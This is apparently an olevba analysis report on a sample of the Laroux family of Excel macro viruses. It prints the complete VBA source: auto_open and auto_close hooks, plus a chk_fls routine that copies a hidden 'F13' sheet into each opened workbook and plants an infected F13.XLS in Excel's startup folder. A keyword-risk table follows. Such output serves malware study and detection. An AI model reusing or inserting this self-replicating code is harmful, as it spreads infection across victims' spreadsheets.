olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO F13.bas 
in file: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9 - OLE stream: '_VBA_PROJECT_CUR/VBA/F13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    If Day(Now()) = 13 And Format(Now(), "ddd") = "Fri" Then
        MsgBox "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" & Chr(13) & "!!! Friday thirteenth !!!!" _
               & Chr(13) & "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    End If
    Application.OnSheetActivate = "chk_fls"
End Sub
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.DisplayAlerts = False
    Workbooks("F13.XLS").Close savechanges:=False
End Sub
Sub chk_fls()
Attribute chk_fls.VB_ProcData.VB_Invoke_Func = " \n14"
 If Dir(Application.StartupPath & "\" & "F13.XLS") = "F13.XLS" Then p = 1 Else p = 0
 If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
 FCD = p + w * 10
    
 Application.ScreenUpdating = False
 N_FNM = ActiveWorkbook.Name
 Select Case FCD
    Case 1
     If Workbooks(N_FNM).Sheets(1).Name <> "F13" Then
        Workbooks("F13.XLS").Sheets("F13").Copy before:=Workbooks(N_FNM).Sheets(1)
        Workbooks(N_FNM).Sheets("F13").Visible = False
     End If
    
    Case 10
     Workbooks.Add
     Workbooks(N_FNM).Sheets("F13").Copy After:=Workbooks(ActiveWorkbook.Name).Sheets(1)
     
     Workbooks(ActiveWorkbook.Name).SaveAs FileName:=Application.StartupPath & "/" & "F13.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
     Windows("F13.XLS").Visible = False
    
    Case 11
     Windows("F13.XLS").Visible = False
    Case Else
 End Select
 Application.OnSheetActivate = ""
 Application.ScreenUpdating = True
 Application.OnSheetActivate = "F13.XLS!chk_fls"
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Laroux.iq-5dd346e37b687cc8d13aae77d150bf649db1e2d9 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  F1
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

